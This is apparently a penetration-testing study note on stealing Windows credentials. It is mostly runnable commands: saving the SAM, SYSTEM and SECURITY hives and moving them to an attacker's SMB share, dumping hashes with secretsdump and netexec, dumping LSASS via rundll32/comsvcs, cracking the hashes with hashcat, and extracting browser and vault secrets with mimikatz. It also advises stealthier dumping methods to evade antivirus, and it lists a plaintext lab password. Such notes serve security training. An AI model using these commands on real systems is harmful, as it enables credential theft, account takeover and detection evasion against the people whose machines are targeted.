---
title: Windows Credentials
tags: [password-attacks, windows, sam, lsass, mimikatz, pypykatz, dpapi, credential-manager, secretsdump]
---

# Windows Credentials

> Windows stores credentials in several places — SAM, LSASS memory, and Credential Manager. Each requires a different extraction technique.

## Windows Authentication Overview

- **WinLogon** — handles interactive logon
- **LSASS** (Local Security Authority Subsystem Service) — enforces security policies and caches credentials in memory
- **SAM** (`%SystemRoot%\system32\config\SAM`) — stores local account hashes
- **NTDS.dit** (`%SystemRoot%\ntds.dit`) — used instead of SAM when the machine is AD-joined

### Authentication DLLs

| DLL | Role |
|-----|------|
| `Lsasrv.dll` | LSA server; selects NTLM or Kerberos |
| `Msv1_0.dll` | Local logon (non-AD) |
| `Samsrv.dll` | Manages SAM database |
| `Kerberos.dll` | Kerberos auth on AD machines |
| `Netlogon.dll` | Network-based logon |
| `Ntdsa.dll` | Active Directory database agent (DC only) |

---

## Attacking SAM, SYSTEM, and SECURITY

The three hives together let you decrypt local password hashes offline.

- `HKLM\SAM` — local account hashes (encrypted with boot key)
- `HKLM\SYSTEM` — boot key (needed to decrypt SAM)
- `HKLM\SECURITY` — LSA secrets: cached domain creds (DCC2), DPAPI keys

### Step 1 — Save hives with reg.exe

```powershell
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

### Step 2 — Host an SMB share on the attacker machine

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py \
  -smb2support CompData /home/ltnbob/Documents/
```

### Step 3 — Move hives to the attacker share

```powershell
move sam.save \\10.10.14.224\CompData
move security.save \\10.10.14.224\CompData
move system.save \\10.10.14.224\CompData
```

### Step 4 — Dump hashes with secretsdump

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  -sam sam.save -security security.save -system system.save LOCAL
# Output format: uid:rid:lmhash:nthash
```

### Step 5 — Crack NTLM hashes

```bash
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

### DCC2 Hashes (Cached Domain Credentials)

DCC2 hashes come from `HKLM\SECURITY` and use PBKDF2.

```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' rockyou.txt
```

### Remote Dumping (needs local admin)

```bash
netexec smb 10.129.42.198 --local-auth -u bob -p @cademy_stdnt! --sam
netexec smb 10.129.42.198 --local-auth -u bob -p @cademy_stdnt! --lsa
```

---

## Attacking LSASS

LSASS holds credentials in memory for every active logon session — NTLM hashes, Kerberos tickets, cleartext (WDIGEST on older systems).

### Method 1 — Task Manager (GUI)

```
1. Open Task Manager
2. Processes tab
3. Right-click "Local Security Authority Process"
4. Create dump file
5. Transfer dump to attacker host
```

### Method 2 — rundll32 + comsvcs.dll (no GUI)

```powershell
# Find LSASS PID
tasklist /svc
# or
Get-Process lsass

# Create dump
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

!!! warning
    Modern AV flags the rundll32/comsvcs method as malicious. Use with caution — consider process injection or handle duplication methods for stealthier dumps.

### Step 3 — Extract credentials with pypykatz

```bash
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

**Sections to look for in output:**

- **MSV** — NTLM and SHA1 hashes (most useful)
- **WDIGEST** — cleartext on Windows XP–2012 (disabled by default on modern Windows)
- **Kerberos** — tickets
- **DPAPI** — master keys for DPAPI-encrypted secrets

```bash
# Crack the NT hash after extraction
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b rockyou.txt
```

---

## DPAPI

DPAPI encrypts data per-user (browser passwords, Windows secrets, certificates).

```bash
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

> Other tools: Impacket's `dpapi.py`, DonPAPI (remote DPAPI extraction).

---

## Credential Manager

Stores saved credentials for network resources, websites, and services.

**Storage paths:**
- `%UserProfile%\AppData\Local\Microsoft\Vault\`
- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
- `%ProgramData%\Microsoft\Vault\`

### Enumerate with cmdkey

```powershell
cmdkey /list
# Shows stored targets, types (Generic / Domain Password), users

# Use stored creds with runas
runas /savecred /user:SRV01\mcharles cmd
```

### Export vault

```powershell
rundll32 keymgr.dll,KRShowKeyMgr
```

### Extract with Mimikatz

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::credman
```

> Additional tools for DPAPI/Credential Manager: `SharpDPAPI`, `LaZagne`, `DonPAPI`.
